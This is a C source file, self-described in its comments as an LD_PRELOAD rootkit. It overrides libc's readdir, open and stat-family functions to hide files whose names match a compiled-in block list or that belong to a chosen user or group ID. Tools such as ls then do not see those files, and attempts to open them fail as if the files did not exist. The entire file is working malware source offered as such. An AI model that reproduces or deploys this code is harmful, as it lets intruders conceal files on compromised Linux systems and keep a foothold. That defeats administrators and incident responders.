/* Copyright (C) 2014 cmj. All right reserved. */
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <string.h>

#include "profile.h"

/* Replaced libc method.
 * We SHOULD follow the original prototype from header file for our respect.
 */
static struct dirent *(*_readdir)(DIR *__dirp);
static struct dirent64 *(*_readdir64)(DIR *__dirp);
static int (*_open)(const char *__file, int __oflag, ...);
static int (*_xstat) (int __ver, const char *__filename, struct stat *__stat_buf);
static int (*_lxstat) (int __ver, const char *__filename, struct stat *__stat_buf);
static int (*_fxstat) (int __ver, int __fildes, struct stat *__stat_buf);
static int (*_xstat64) (int __ver, const char *__filename, struct stat64 *__stat_buf);
static int (*_lxstat64) (int __ver, const char *__filename, struct stat64 *__stat_buf);
static int (*_fxstat64) (int __ver, int __fildes, struct stat64 *__stat_buf);

/* A rootkit which is LD_PRELOAD based and replce libc method.
 *
 * Author: cmj0121@gmail.com
 *
 */
__attribute__((constructor)) void begin(void) {
#ifdef DEBUG
	fprintf(stderr, "Load Customize preload library...\n");
#endif /* DEBUG */
	_readdir	= dlsym(RTLD_NEXT, "readdir");
	_readdir64	= dlsym(RTLD_NEXT, "readdir64");
	_open		= dlsym(RTLD_NEXT, "open");
	_xstat		= dlsym(RTLD_NEXT, "__xstat");
	_lxstat		= dlsym(RTLD_NEXT, "__lxstat");
	_fxstat		= dlsym(RTLD_NEXT, "__fxstat");
	_xstat64	= dlsym(RTLD_NEXT, "__xstat64");
	_lxstat64	= dlsym(RTLD_NEXT, "__lxstat64");
	_fxstat64	= dlsym(RTLD_NEXT, "__fxstat64");
}
/*
 *	Filter out any string occurred in BLOCK_LIST
 */
inline int filter(const char *name, __uid_t uid, __gid_t gid) {
	char LIST[BUFSIZ] = {0};
	char *ptr = NULL, *ch = NULL;
#if defined(UID) || defined(GID)
	struct stat st;
#endif

	/* Check the key word occurred on the path */
	if (NULL != name) {
		strcpy(LIST, BLOCK_LIST);
		ptr = LIST;
		while(NULL != (ch = strchr(ptr, ' '))) {
			*ch = '\0';
			if (NULL != strstr(name, ptr)) goto TRAPE;
			ptr = ch + 1;
		}
		if (NULL != strstr(name, ptr)) goto TRAPE;
	}

	/* Check the UID/GID is occurred on the file */
#if defined(UID) || defined(GID)
	if (NULL != _xstat && (-1 == uid && -1 == gid)) {
		_xstat(_STAT_VER, name, &st);
		uid = st.st_uid;
		gid = st.st_gid;
	}
#if UID
	if (uid == UID) goto TRAPE;
#endif
#if GID
	if (gid == GID) goto TRAPE;
#endif
	
#endif
	return 0;
TRAPE:
	return 1;
}

/* Filter out the result for ls */
struct dirent *readdir(DIR *__dirp) {
	struct dirent *_ = NULL;
	
	PROFILE(readdir);

	while (NULL != (_ = _readdir(__dirp)) && 0 != filter(_->d_name, -1, -1));
	return _;
}
struct dirent64 *readdir64(DIR *__dirp) {
	struct dirent64 *_ = NULL;

	PROFILE(readdir64);

	while (NULL != (_ = _readdir64(__dirp)) && 0 != filter(_->d_name, -1, -1));
	return _;
}

/* Filter out the resupt for file-related */
int open(const char *__file, int __oflag, ...) {
	int _;
	va_list args;

	PROFILE(open);

	if (0 != filter(__file, -1, -1)) {
		errno = ENOENT;
		return -1;
	}
	va_start(args, __oflag);
	_ = _open(__file, __oflag, args);
	va_end(args);
	return _;
}

int __xstat(int __ver, const char *__filename, struct stat *__stat_buf) {
	int _;

	PROFILE(xstat);

	if (0 != filter(__filename, -1, -1)) {
		errno = ENOENT;
		return -1;
	}
	_ = _xstat(__ver, __filename, __stat_buf);
	return _;
}
int __lxstat(int __ver, const char *__filename, struct stat *__stat_buf) {
	int _;

	PROFILE(lxstat);

	_ = _lxstat(__ver, __filename, __stat_buf);
	if (0 != filter(__filename, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
int __fxstat(int __ver, int __fildes, struct stat *__stat_buf) {
	int _;

	PROFILE(fxstat);

	_ = _fxstat(__ver, __fildes, __stat_buf);
	if (0 != filter(NULL, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
int __xstat64(int __ver, const char *__filename, struct stat64 *__stat_buf) {
	int _;

	PROFILE(xstat);

	if (0 != filter(__filename, -1, -1)) {
		errno = ENOENT;
		return -1;
	}
	_ = _xstat64(__ver, __filename, __stat_buf);
	return _;
}
int __lxstat64(int __ver, const char *__filename, struct stat64 *__stat_buf) {
	int _;

	PROFILE(lxstat);

	_ = _lxstat64(__ver, __filename, __stat_buf);
	if (0 != filter(__filename, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
int __fxstat64(int __ver, int __fildes, struct stat64 *__stat_buf) {
	int _;

	PROFILE(fxstat);

	_ = _fxstat64(__ver, __fildes, __stat_buf);
	if (0 != filter(NULL, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
